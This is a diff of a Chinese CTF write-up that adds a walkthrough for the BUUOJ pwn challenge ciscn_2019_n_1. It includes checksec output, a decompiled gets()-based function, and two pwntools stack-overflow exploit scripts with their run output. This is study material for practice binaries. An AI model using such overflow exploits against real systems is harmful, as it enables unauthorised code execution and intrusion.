@@ -174,7 +174,7 @@ flag{<flag here>}
 接着使用 `checksec` 命令识别安全属性
 
 ```shell
-┌──(hervey㉿ZHW)-[~/Downloads]
+┌──(hervey㉿Hervey)-[~/Downloads]
 └─$ checksec --file=warmup_csaw_2016
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
 Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No Symbols        No    0               2               warmup_csaw_2016
@@ -243,7 +243,7 @@ p.interactive()
 运行该脚本，获取 flag
 
 ```shell
-┌──(hervey㉿ZHW)-[~/Downloads]
+┌──(hervey㉿Hervey)-[~/Downloads]
 └─$ python3 ./sol.py
 [+] Opening connection to <IP Address> on port <Port>: Done
 [*] Switching to interactive mode
@@ -255,3 +255,117 @@ $
 ```
 
 进而获得 flag
+
+### [PWN-ciscn_2019_n_1](https://buuoj.cn/challenges#ciscn_2019_n_1)
+
+下载后获得文件 ciscn_2019_n_1
+
+先使用 `file` 命令查看文件类型，发现是一个 ELF 64 位程序
+
+```shell
+┌──(hervey㉿Hervey)-[~/Downloads]
+└─$ file ./ciscn_2019_n_1
+./ciscn_2019_n_1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8a733f5404b1e2c65e1758c7d92821eb8490f7c5, not stripped
+```
+
+接着使用 `checksec` 命令识别安全属性
+
+```shell
+┌──(hervey㉿Hervey)-[~/Downloads]
+└─$ checksec --file=ciscn_2019_n_1
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   73 Symbols        No    0               1               ciscn_2019_n_1
+```
+
+发现没有开启栈保护
+
+使用 IDA 64 打开查看源程序，找到 `main` 函数中的 `func()`
+
+```c
+int func()
+{
+  char v1[44]; // [rsp+0h] [rbp-30h] BYREF
+  float v2; // [rsp+2Ch] [rbp-4h]
+
+  v2 = 0.0;
+  puts("Let's guess the number.");
+  gets(v1);
+  if ( v2 == 11.28125 )
+    return system("cat /flag");
+  else
+    return puts("Its value should be 11.28125");
+}
+```
+
+发现这里有个危险函数 `gets()`
+
+#### 解法一
+
+跟前面的题目一样，尝试直接跳过判断，通过栈溢出让程序直接跳转到 `system("cat /flag");` 语句
+
+双击进入 `v1` 可以得到变量 `v1` 的大小为 `0x30` ，偏移长度为 `0x8`
+
+![PWN-ciscn_2019_n_1-1](./Notes-on-PWN/PWN-ciscn_2019_n_1-1.png)
+
+进入汇编页面可以获得 `system("cat /flag")` 的地址为 `0x4006BE`
+
+![PWN-ciscn_2019_n_1-2](./Notes-on-PWN/PWN-ciscn_2019_n_1-2.png)
+
+编写以下脚本获取 flag
+
+```python
+from pwn import *
+p = remote("<IP Address>", <Port>)
+payload = b'A' * (0x30 + 0x8) + p64(0x4006BE)
+p.sendline(payload)
+p.interactive()
+```
+
+运行该脚本，获取 flag
+
+```shell
+┌──(hervey㉿Hervey)-[~/Downloads]
+└─$ python3 ./sol.py
+[+] Opening connection to node5.buuoj.cn on port 28081: Done
+[*] Switching to interactive mode
+Let's guess the number.
+Its value should be 11.28125
+flag{<flag here>}
+[*] Got EOF while reading in interactive
+$
+```
+
+#### 解法二
+
+尝试对变量 `v2` 的地址进行覆盖，使其满足条件
+
+通过 IDA 64 的注释可以得知变量 `v1` 和 `v2` 之间的偏移为 `0x30-0x04`
+
+![PWN-ciscn_2019_n_1-3](./Notes-on-PWN/PWN-ciscn_2019_n_1-3.png)
+
+我们需要将 `v2` 的值修改为 `11.28125` ，对应的十六进制值为 `41348000h`
+
+![PWN-ciscn_2019_n_1-4](./Notes-on-PWN/PWN-ciscn_2019_n_1-4.png)
+
+于是我们可以构造出如下脚本
+
+```python
+from pwn import *
+p = remote("<IP Address>", <Port>)
+payload = b'A' * (0x30 - 0x4) + p64(0x41348000)
+p.sendline(payload)
+p.interactive()
+```
+
+运行该脚本，获取 flag
+
+```shell
+┌──(hervey㉿Hervey)-[~/Downloads]
+└─$ python3 ./sol.py
+[+] Opening connection to <IP Address> on port <Port>: Done
+[*] Switching to interactive mode
+Let's guess the number.
+flag{<flag here>}
+[*] Got EOF while reading in interactive
+$
+```
